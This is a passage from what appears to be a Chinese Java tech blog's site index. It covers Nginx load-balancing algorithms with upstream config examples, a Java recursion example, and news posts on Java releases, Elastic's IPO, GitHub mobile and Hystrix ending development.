title="Nginx的5种负载均衡算法"></a>Nginx的5种负载均衡算法</h4><p><strong>1、轮询（默认）</strong></p><p>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。  </p><p><strong>2、weight</strong></p><p>指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。</p><p>例如：  </p><pre class="line-numbers language-none"><code class="language-none">upstream bakend &#123;    server 192.168.0.14 weight&#x3D;10;    server 192.168.0.15 weight&#x3D;10;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、ip_hash</strong></p><p>每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。  </p><p>例如：  </p><pre class="line-numbers language-none"><code class="language-none">upstream bakend &#123;    ip_hash;    server 192.168.0.14:88;    server 192.168.0.15:80;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4、fair（第三方）</strong></p><p>按后端服务器的响应时间来分配请求，响应时间短的优先分配。  </p><pre class="line-numbers language-none"><code class="language-none">upstream backend &#123;    server server1;    server server2;    fair;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5、url_hash（第三方）</strong> </p><p>按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。  </p><p>例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法。</p><pre class="line-numbers language-none"><code class="language-none">upstream backend &#123;    server squid1:3128;    server squid2:3128;    hash $request_uri;    hash_method crc32;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tips:  </p><pre class="line-numbers language-none"><code class="language-none">upstream bakend&#123;#定义负载均衡设备的Ip及设备状态    ip_hash;    server 127.0.0.1:9090 down;    server 127.0.0.1:8080 weight&#x3D;2;    server 127.0.0.1:6060;    server 127.0.0.1:7070 backup;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在需要使用负载均衡的server中增加  </p><pre class="line-numbers language-none"><code class="language-none">proxy_pass http:&#x2F;&#x2F;bakend&#x2F;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>每个设备的状态设置为：</strong></p><p>1.down 表示单前的server暂时不参与负载<br>2.weight 默认为1.weight越大，负载的权重就越大。<br>3.max_fails ：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream 模块定义的错误<br>4.fail_timeout:max_fails次失败后，暂停的时间。<br>5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。  </p><p>nginx支持同时设置多组的负载均衡，用来给不用的server来使用。  </p><p>client_body_in_file_only：设置为On，可以讲client post过来的数据记录到文件中用来做debug。</p><p>client_body_temp_path：设置记录文件的目录，可以设置最多3层目录。</p><p>location：对URL进行匹配，可以进行重定向或者进行新的代理，负载均衡。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>递归算法介绍及 Java 应用实战</title>
      <link href="/2025/10/30/%E7%AE%97%E6%B3%95/%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95%E4%BB%8B%E7%BB%8D%E5%8F%8A%20Java%20%E5%BA%94%E7%94%A8%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/30/%E7%AE%97%E6%B3%95/%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95%E4%BB%8B%E7%BB%8D%E5%8F%8A%20Java%20%E5%BA%94%E7%94%A8%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1513930120521&di=e148a55622ee37e7c15cf3447e3538fc&imgtype=0&src=http://image.codes51.com/Article/image/20160509/20160509185614_6256.jpg" alt="image"></p><h4 id="什么是递归算法"><a href="#什么是递归算法" class="headerlink" title="什么是递归算法"></a>什么是递归算法</h4><p>递归算法是把问题转化为规模缩小了的同类问题的子问题，然后递归调用函数（或过程）来表示问题的解。一个过程(或函数)直接或间接调用自己本身，这种过程(或函数)叫递归过程(或函数)。</p><p>递归过程一般通过函数或子过程来实现。递归方法：在函数或子过程的内部，直接或者间接地调用自己的算法。递归其实就是在栈内存中不断的加载同一个函数</p><h4 id="什么时候用递归呢？"><a href="#什么时候用递归呢？" class="headerlink" title="什么时候用递归呢？"></a>什么时候用递归呢？</h4><p>当一个功能被重复使用，而每一次使用该功能时的参数不确定，都由上次的功能元素结果来确定。 </p><h4 id="递归的注意事项"><a href="#递归的注意事项" class="headerlink" title="递归的注意事项"></a>递归的注意事项</h4><ol><li>必须有可最终达到的终止条件，否则程序将陷入无穷循环出现栈内存溢出错误（StackOverflowError）；</li><li>子问题在规模上比原问题小，或更接近终止条件；</li><li>子问题可通过再次递归调用求解或因满足终止条件而直接求解；</li><li>子问题的解应能组合为整个问题的解。</li></ol><h4 id="递归实战"><a href="#递归实战" class="headerlink" title="递归实战"></a>递归实战</h4><p>下面用递归来实现从1+2+3+…N的小例子。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;System.out.println(sum(10));&#125;private static int sum(int n) &#123;if (n &#x3D;&#x3D; 1) &#123;return n;&#125; else &#123;return n + sum(n - 1);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的例子采用递归算法从1加到10，看着是倒着来的从10加到1，每次减1进行相加真到最后为1终止。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6月来了，Java还是第一！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/6%E6%9C%88%E6%9D%A5%E4%BA%86%EF%BC%8CJava%E8%BF%98%E6%98%AF%E7%AC%AC%E4%B8%80%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/6%E6%9C%88%E6%9D%A5%E4%BA%86%EF%BC%8CJava%E8%BF%98%E6%98%AF%E7%AC%AC%E4%B8%80%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>今天是2019年6月1号，栈长祝各位小程序猿们节日快乐。</p><p>话说现在很多小孩子都开始接触幼儿编程了，我也经常看到幼儿编程的广告，编程门槛真的是越来越低。</p><p>除此之外，也有大量其他行业的从业者想转软件开发的，编程那么广，语言那么多，那么在这么多编程语言中，有哪些热门的编程语言该值得学习呢？</p><p>下面这个排行榜来自 TIOBE 最新统计报告，这份报告每月都会出一次。</p><p><img src="http://img.javastack.cn/1559352826761.jpg"></p><p>最新数据显示，Java依旧排名第一，那些担心还学不学Java，唱衰 Java 的人该打自己脸了，无论从语言排行榜还是就业岗位数量来说 Java 无疑都是最大的编程市场。</p><p>这个报告中的编程语言也许不是你最喜欢的，也许不是最优秀的，但却是最主流的，它是根据各种维度来计算流行度的，非常权威。</p><p>本次报告最出人意外的是，连续 3 年在榜前 20 的 R 语言居然首次跌出前 20。而最大的赢家就是 Python 了，虽然 Java 长期霸榜，但增长非常缓慢，Python在数据分析和统计以及人工智能的兴起大军中杀出一条血路，目前排行第四，追上 C++ 指日可待！</p><p>虽然如此，Java也别慌，Python攻克的领域和Java完全不同，Java主要应用于企业 web 端及后端系统开发，生态非常成熟，运用 Java 的大公司及大型系统数不胜数，跟着大环境走，怕个卵。。。</p><p>即使如此，我们也不能放弃治疗，不能止步于Java，平时也得多了解其他语言，存在即合理，其他语言必然也有其精妙之处值得我们学习和借鉴。</p><p>所以说，除了Java，你还是有必要掌握其他一门语言的，有备无患，技多不压身，也是你日后能升职加薪的重要筹码。</p><p>稳住，我们能赢！</p><p>你觉得 Java 前景到底如何？欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eclipse 代替 Oracle 接管 Java EE</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Eclipse%20%E4%BB%A3%E6%9B%BF%20Oracle%20%E6%8E%A5%E7%AE%A1%20Java%20EE/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Eclipse%20%E4%BB%A3%E6%9B%BF%20Oracle%20%E6%8E%A5%E7%AE%A1%20Java%20EE/</url>
      
        <content type="html"><![CDATA[<p>Eclipse Foundation将接替Oracle成为Java EE的新东家，Oracle不再管理Java EE。</p><p>作为采用的一部分，Java EE可能会更换新名称，Oracle建议在其建议中使用Java EE。</p><p>一个月前，Oracle表示将结束Java EE的管理角色，并将其转到开源基础上。<br>在与IBM和Red Hat等Java合作伙伴进行协商后，Oracle与几个基金会进行了会谈，并确定了一个在Java开发中有着悠久历史的组织:Eclipse基金会。<br>Eclipse创建了流行的Eclipse IDE并管理了多个其他Java技术。</p><p>Oracle借鉴了Eclipse在Java EE和相关技术方面的经验，所以它将Java EE转移到Eclipse。</p><p>Oracle David Delabassee说:“这将帮助我们快速过渡Java EE，为开发平台创建社区友好的流程，并利用微配置等辅助项目。”</p><p>去年，在Java社区的一部分人担心Oracle忽视了这个平台后，MicroProfile就成为了一个Red Hat和ibm驱动的努力，以适应Java EE的微服务功能。MicroProfile已经移动到Eclipse。</p><p>Eclipse执行董事Mike Milinkovich说:“将Java EE移动到开放的治理和协作将是一个过程，而不是一个事件。”<br>“我们与甲骨文(Oracle)、IBM和红帽(Red Hat)的早期讨论已经表明，在他们的领导团队中，有很多人支持这一点。”</p><p>Milinkovich也同意Oracle对Java EE的修改，以更好地支持云计算。“随着企业转向以云为中心的模式，很明显，Java EE需要更快的创新步伐。”</p><p>Oracle最近改进了其对Java EE采用的建议:</p><p>1、定义平台的品牌战略，包括尚未确定的Java EE的新名称。</p><p>2、将Java EE和相关的GlassFish应用服务器技术重新授权给采用的基础。(GlassFish已经作为Java EE参考实现了。)</p><p>3、演示提供Java EE兼容实现的能力。</p><p>4、定义现有规范可以演进的过程，Java EE必须在Java社区过程中开发。</p><p>5、招募开发者和其他人赞助平台技术。</p><p>Java EE构建于Java平台、标准版(Java SE)之上，面向大规模、多层和安全的网络应用程序。Java EE 8很快就会出现。</p><p>Oracle将继续支持现有的Java EE被许可方，包括那些迁移到Java EE 8的被许可方。它还将继续支持十年前从BEA系统获得的WebLogic服务器Java应用服务器，Java EE 8将在即将到来的WebLogic Server升级中得到支持。</p><p>Oracle也在保持其对Java SE的领导地位，最近更是提出了加快Java9的发布计划。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Search 上市了，市值翻倍，这群人财务自由了！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Elastic%20Search%20%E4%B8%8A%E5%B8%82%E4%BA%86%EF%BC%8C%E5%B8%82%E5%80%BC%E7%BF%BB%E5%80%8D%EF%BC%8C%E8%BF%99%E7%BE%A4%E4%BA%BA%E8%B4%A2%E5%8A%A1%E8%87%AA%E7%94%B1%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Elastic%20Search%20%E4%B8%8A%E5%B8%82%E4%BA%86%EF%BC%8C%E5%B8%82%E5%80%BC%E7%BF%BB%E5%80%8D%EF%BC%8C%E8%BF%99%E7%BE%A4%E4%BA%BA%E8%B4%A2%E5%8A%A1%E8%87%AA%E7%94%B1%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>国庆长假，大部分人还深浸在风花雪月之中，而就在昨天（美国时间10月5号），我们 Java 程序员所熟知的大名鼎鼎的 Elastic Search 居然在美国纽约证券交易所上市了！</p><p><img src="http://img.javastack.cn/18-10-7/64836645.jpg"></p><p>当说到搜索时，大部分人可能只会说谷歌、百度等，但在企业内部的数据搜索还面临许多挑战，这就需要依赖开源的搜索技术，Elastic 公司就诞生了。</p><p><img src="http://img.javastack.cn/18-10-7/60204672.jpg"></p><p>所以，其实不能说是 Elastic Search 上市，应该说是其背后的 Elastic 公司上市，Elastic Search 只是 Elastic 公司最出名的产品之一，其中还包括有分布式日志解决方案 ELK（Elastic Search、Logstash、Kibana）、Beats、ECE等。</p><p>Elastic Search 只是比其公司 Elastic 更有影响力，如果你还不知道什么是 Elastic Search, 我们来看下官网的描述。</p><blockquote><p>Elasticsearch is a distributed, RESTful search and analytics engine capable of solving a growing number of use cases. As the heart of the Elastic Stack, it centrally stores your data so you can discover the expected and uncover the unexpected.</p></blockquote><p>翻译就是：</p><blockquote><p>Elasticsearch 是一个分布式的基于 RESTful 接口的搜索和分析引擎，它能够解决越来越多的使用场景。作为 Elastic Stack 的核心，它集中存储数据，可以发现预期及之外的结果。</p></blockquote><p>简单的说，Elastic Search 是当前最主流最热门的开源分布式全文搜索引擎，2010 年发布，基于 Java 语言开发，以 JSON 格式文档来存储数据，并提供了 RESTful Web 服务接口访问，能以非常快的速度来检索非常大的数据量。</p><p>目前 Elastic Search 被许多大型组织使用，如 Wikipedia，StackOverflow，GitHub 等，国内更是遍地开花。做电商的同学最清楚不过了，如商品的管理和搜索工作都是用它来做的，简直就是电商系统数据存储搜索之必备良药。</p><p>Elastic 昨天上市，震惊技术界，在 Elastic 的官网博客申明中，博主也看到了最新的致谢内容，即感谢所有用户、客户及合作伙伴，并对过去和未来做了总结和展望。</p><p><img src="http://img.javastack.cn/18-10-6/36130911.jpg"></p><blockquote><p>官方致谢申明：<br><a href="https://www.elastic.co/blog/ze-bell-has-rung-thank-you-users-customers-and-partners">https://www.elastic.co/blog/ze-bell-has-rung-thank-you-users-customers-and-partners</a></p></blockquote><p>Elastic 上市后，其股票（股票代码：ESTC）更是大涨，发行价为 36 美元，最高涨至 74.20 美元，最终收盘价为 70.00 美元，涨幅 94.44%，几乎翻倍。从公司成立到上市仅用了 8 年，超过 3.5+ 亿的产品下载，100万+ 名开发人员及 5,500+ 个客户，也是牛逼，这一上市，不知道又有多少人从此实现财务自由。。</p><p><img src="http://img.javastack.cn/18-10-6/45408673.jpg"></p><p>上市后，大家可能有疑惑以后会不会收费，对开源有没有影响，这个不用多忧虑。大多开源项目（如:MongoDB），除了开源版本之外，都会额外提供收费的云服务（即：SaaS），Elastic 亦是如此，我们也可以在 Elastic 官网找到对应的收费云服务。毕竟 Elastic 是一个家公司，是公司就要生存，要吃饭，提供云付费产品也是其生存之本。</p><p><img src="http://img.javastack.cn/18-10-6/31555398.jpg"></p><p>收费意味着可以有更好的安全保障及售后服务，但国内貌似都喜欢折腾，一方面也为了数据安全性，所以大多使用的是开源版本。对数据不敏感，且没有能力折腾开源版本的可以使用其收费云服务，并且官方提供免费 14 天试用期。</p><p>外国人的技术就是牛逼，随便整几个开源产品就能上市，去年 MongoDB 上市，今年就是 Elastic Search, 后面还有更多后起之秀，不说了，我先去 Github 搞个开源项目。。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub for mobile 来了，码农苦逼了！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/GitHub%20for%20mobile%20%E6%9D%A5%E4%BA%86%EF%BC%8C%E7%A0%81%E5%86%9C%E8%8B%A6%E9%80%BC%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/GitHub%20for%20mobile%20%E6%9D%A5%E4%BA%86%EF%BC%8C%E7%A0%81%E5%86%9C%E8%8B%A6%E9%80%BC%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>北京时间 2019 年 11 月 14 日 GitHub Universe 2019 大会上，GitHub 正式发布了 <strong>GitHub for mobile</strong>，即 GitHub 的移动版本，支持 iOS 与 Android 两大平台。</p><p>以下是全文：</p><blockquote><p><a href="https://github.blog/2019-11-13-universe-day-one/">https://github.blog/2019-11-13-universe-day-one/</a></p></blockquote><p>GitHub for mobile 提供了强大的便利性，无论你身在何处都可以继续与开发团队保持协作，能很方便的做很多不是十分复杂的事情，比如分享反馈、Code Review 等，如下图所示。</p><p><img src="http://img.javastack.cn/20191115110012.png"></p><p>GitHub for mobile 作为一个移动端原生应用程序，能自动适配各种屏幕尺寸，甚至在暗模式下也可以根据你的设备偏好进行调整。</p><p><img src="http://img.javastack.cn/20191115110136.png"></p><p>iOS 目前还是 Beta 版本，Android Beta 版也即将发布。</p><p>申请下载地址：</p><blockquote><p><a href="https://github.com/mobile/beta">https://github.com/mobile/beta</a></p></blockquote><p><img src="http://img.javastack.cn/20191115110519.png"></p><p>虽然这样是方便了，但码农苦逼了，以后挤个地铁，搭个班车，都能随时随地写代码、改 bug 了。。</p><p>即使如此，据我了解，为了安全起见，现在企业大家都用的自己的代码私库，并不会把公司的项目用到 Github 上面，用得更多的是国外开发者或者个人用户了。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hystrix 停止开发，Spring Cloud 何去何从？</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Hystrix%20%E5%81%9C%E6%AD%A2%E5%BC%80%E5%8F%91%EF%BC%8CSpring%20Cloud%20%E4%BD%95%E5%8E%BB%E4%BD%95%E4%BB%8E%EF%BC%9F/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Hystrix%20%E5%81%9C%E6%AD%A2%E5%BC%80%E5%8F%91%EF%BC%8CSpring%20Cloud%20%E4%BD%95%E5%8E%BB%E4%BD%95%E4%BB%8E%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><img src="http://qianniu.javastack.cn/18-11-29/72621668.jpg"></p><p>栈长得到消息，Hystrix 停止开发了。。。</p><p>大家如果有对 Hystrix 不清楚的，请看下这篇文章：<a href="https://mp.weixin.qq.com/s/w9lK_lwfaTbq5aU4byugaA">分布式服务防雪崩熔断器，Hystrix理论+实战</a>。</p><p>来看下 Hystrix 停止开发官宣：</p><blockquote><p><a href="https://github.com/Netflix/Hystrix">https://github.com/Netflix/Hystrix</a></p></blockquote><p><img src="http://qianniu.javastack.cn/18-11-29/66626010.jpg"></p><p><strong>文中大概的意思是：</strong></p><p>Hystrix 不再继续开发了，目前的稳定版本 1.5.18 已经足够满足现有应用对 Hystrix 的需求。</p><p>停止开发，意味着：</p><ul><li>不再主动修复bugs</li><li>不再接受合并请求</li><li>不再发布新版本</li></ul><p>即使停止开发，但不影响现有的项目，大家可以继续使用 Hystrix，没有问题的。但新项目还是推荐大家使用开源容错组件：Resilience4j。</p><blockquote><p>Resilience4j 是一个轻量级的容错组件，其灵感来自于 Hystrix，主要为 Java 8 和函数式编程设计的.</p></blockquote><p>看到这里，栈长表示学不动了。。。</p><p><img src="http://qianniu.javastack.cn/18-11-29/10737668.jpg"></p><p>同时，它们的重心不再是预先配置达到限流的目的，而转移到了应用程序本身的实时性能上。</p><p>这些年来，Hystrix 为 Netflix 和各大互联网公司提供了良好的服务，停止开发并不意味着 Hystrix 的理念不再有价值，反而激发了许多更优秀的项目。</p><h2 id="Spring-Cloud-何去何从？"><a href="#Spring-Cloud-何去何从？" class="headerlink" title="Spring Cloud 何去何从？"></a>Spring Cloud 何去何从？</h2><p>为什么这么说？因为 Spring Cloud 默认使用 Hystrix 作为其服务默认的熔断组件，Hystrix 的停止开发必然会对 Spring Cloud 造成影响。。。</p><p>上面说了，Hystrix 官方推荐替代的开源组件：Resilience4j，这个栈长也没有用过，查了下，资料也比较稀少。</p><p>那除了 Resilience4j 这个，还有没有别的替代品呢？</p><p>前些天已经告诉大家《<a href="https://mp.weixin.qq.com/s/69ecH-MN5ZOnvSnSiWMu-w">Spring Cloud for Alibaba 来了</a>》，这其中就会包含另外一个阿里开源的组件：Sentinel，它是一个轻量级的高可用防护的流量管理框架。</p><p>Sentinel 开源地址：</p><blockquote><p><a href="https://github.com/alibaba/Sentinel">https://github.com/alibaba/Sentinel</a></p></blockquote><p>但现在 Spring Cloud Alibaba 项目还在孵化当中，2019 年才转正，所以现在集成 Spring Cloud 用 Sentinel 还为时过早。</p><p>后面 Spring Cloud 会使用什么组件作为其默认的熔断组件还不好说，但我们必须提前做好准备，知道了这些替代品，就不会慌了。</p><p>Spring Cloud 也是醉了，Eureka 2.x 难产，现在 Hystrix 又停止开发，大家怎么看？</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 11 快要来了，编译 &amp; 运行一个命令搞定！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Java%2011%20%E5%BF%AB%E8%A6%81%E6%9D%A5%E4%BA%86%EF%BC%8C%E7%BC%96%E8%AF%91%20&amp;%20%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E5%91%BD%E4%BB%A4%E6%90%9E%E5%AE%9A%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Java%2011%20%E5%BF%AB%E8%A6%81%E6%9D%A5%E4%BA%86%EF%BC%8C%E7%BC%96%E8%AF%91%20&amp;%20%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E5%91%BD%E4%BB%A4%E6%90%9E%E5%AE%9A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Java 11 马上要来了，原定于 9 月发布，还有不到 3 个月了，敬请期待更多新功能被加入到 11 当中，本文本讲的是 <code> JEP 330</code> 这个新特性。</p><h4 id="化繁为简，一个命令编译运行源代码"><a href="#化繁为简，一个命令编译运行源代码" class="headerlink" title="化繁为简，一个命令编译运行源代码"></a>化繁为简，一个命令编译运行源代码</h4><p>看下面的代码。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 编译javac Javastack.java&#x2F;&#x2F; 运行java Javastack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在我们的认知里面，要运行一个 Java 源代码必须先编译，再运行，两步执行动作。而在未来的 Java 11 版本中，通过一个 <code>java</code> 命令就直接搞定了，如以下所示。</p><pre class="line-numbers language-none"><code class="language-none">java Javastack.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然而，这也并没有什么卵用。我们大部分开发工作都在 IDE 工具中，所有的编译运行过程都由 IDE 完成的，真正用到命令行来编译、运行的场景真的非常少。当然，如果你是记事本大神，请收下这个功能。</p><p>从另外一面来看，这是不是意味着 <code>javac</code> 要退出历史舞台了呢？不会。因为，还是需要编译源代码的命令的，而不是直接运行。</p><h4 id="支持-Shebang-符号运行-Java-程序"><a href="#支持-Shebang-符号运行-Java-程序" class="headerlink" title="支持 Shebang #! 符号运行 Java 程序"></a>支持 Shebang #! 符号运行 Java 程序</h4><p>Shebang #! 这是什么鬼？这也是  <code>JEP 330</code> 里面的相关技术，它能支持在 UNIX 系统脚本中运行 Java 程序，如以下代码所示。</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;path&#x2F;to&#x2F;java --source version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="JEP-330-总结"><a href="#JEP-330-总结" class="headerlink" title="JEP 330 总结"></a>JEP 330 总结</h4><p>Oracle <code>JEP 330</code> 这个特性只是为了为了编译和运行小型的 Java 应用程序而提供的，而不是使用 Java 变成成能通用性语言。这个特性评审时就饱受争议，但最终达成共识确认会被加入到 Java 11 新版本当中。</p><blockquote><p>参考资料：<a href="https://securityonline.info/jdk-11-will-introduce-shebang-symbol/">https://securityonline.info/jdk-11-will-introduce-shebang-symbol/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 13 发布了！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Java%2013%20%E5%8F%91%E5%B8%83%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Java%2013%20%E5%8F%91%E5%B8%83%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/20190918161554.png"></p><p><strong>通告一下，Java 13 09&#x2F;17 发布了，尝鲜地址：</strong></p><blockquote><p><a href="https://www.oracle.com/technetwork/java/javase/downloads/index.html#JDK13">https://www.oracle.com/technetwork/java/javase/downloads/index.html#JDK13</a></p></blockquote><p>大家知道就好，有兴趣的在本地捣鼓一下，应该没人说想用在生产吧。。</p><p><strong>Java 13 新特性介绍：</strong></p><blockquote><p><a href="https://www.oracle.com/technetwork/java/javase/13all-relnotes-5461743.html#NewFeature">https://www.oracle.com/technetwork/java/javase/13all-relnotes-5461743.html#NewFeature</a></p></blockquote><p>大家先了解下吧，后面栈长有时间会出下 Java 13 方面的新特性教程。</p><p>Java 12 的已经写了几篇，有兴趣的可以学习下。</p><p>《<a href="https://mp.weixin.qq.com/s/D3EkwSheGITW5yFvqGsQbA">Java 12 骚操作，String居然还能这样玩！</a>》</p><p>《<a href="https://mp.weixin.qq.com/s/EY-2gqbbynshCshRlM3Qsw">Java 12 骚操作，switch居然还能这样玩！</a>》</p><p>《<a href="https://mp.weixin.qq.com/s/sNA_eVsVMgNorI61e78VCQ">Java 12 骚操作，文件对比居然还能这样玩！</a>》</p><p>还有好多，不一一列举了：</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 9 被无情抛弃，Java 8 直接升级到 Java 10！！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Java%209%20%E8%A2%AB%E6%97%A0%E6%83%85%E6%8A%9B%E5%BC%83%EF%BC%8CJava%208%20%E7%9B%B4%E6%8E%A5%E5%8D%87%E7%BA%A7%E5%88%B0%20Java%2010%EF%BC%81%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Java%209%20%E8%A2%AB%E6%97%A0%E6%83%85%E6%8A%9B%E5%BC%83%EF%BC%8CJava%208%20%E7%9B%B4%E6%8E%A5%E5%8D%87%E7%BA%A7%E5%88%B0%20Java%2010%EF%BC%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-4-25/8989863.jpg"></p><p>前几天写了一篇 Java 8 即将在 2019 年停止免费向企业提供更新的文章，企图迫使用户向更新一代的 Java 版本升级，但让人遗憾的是，小编今天收到了 Oracle Java 版本的升级推送，装完居然是 Java 10 !!!! </p><p>很意外，为什么直接从 Java 8 升级到了 Java 10，去年未满一岁的亲儿子 9 呢？？抱着怀疑的心态去 Oracle 看了下，置顶推荐的是 Java 10.0.1，9也不见了，真是6翻了。。</p><p>Java 9 还可以下载，不过官方不建议使用了。</p><blockquote><p><a href="http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase9-3934878.html">http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase9-3934878.html</a></p></blockquote><p><img src="http://img.javastack.cn/18-4-25/26712342.jpg"></p><p>Java 10 添加的新功能 <code>var</code> 也是让人咋舌！！</p><blockquote><p>Java SE 10.0.1 is the latest release of Java SE Platform. This release contains improvements like Local-Variable Type Inference, Parallel Full GC, Application Class-Data Sharing. Oracle strongly recommends that all Java SE users upgrade to this release.</p></blockquote><p>Oracle 强烈推荐所有使用 Java SE 的用户升级到 Java 10.0.1，刚出就强烈推荐，厉害了！看样子 9 已经被无情抛弃了，不管什么原因，Java 10 肯定是趋势了，毕竟 11 已经有了预览版了。关于 Java 10 的新特性可以看往期文章，后面我们会陆续推出 Java 10 的更多新特性实战。</p><hr><p>今天我们又购买了极客时间的 <strong>“从0开始学架构”</strong> 技术专栏，和阿里 P9 级别技术专家学架构。本专栏会在知识星球微信群中免费分享，目前已经有 3 个付费专栏火热分享中，点击左下方的阅读原文加入知识星球一起学习。有兴趣的土豪也可以扫描以下海报自己购买，凭此海报新用户扫描购买有优惠。</p><p><img src="http://img.javastack.cn/18-4-25/29811681.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 序列化技术即将被废除！！！</title>
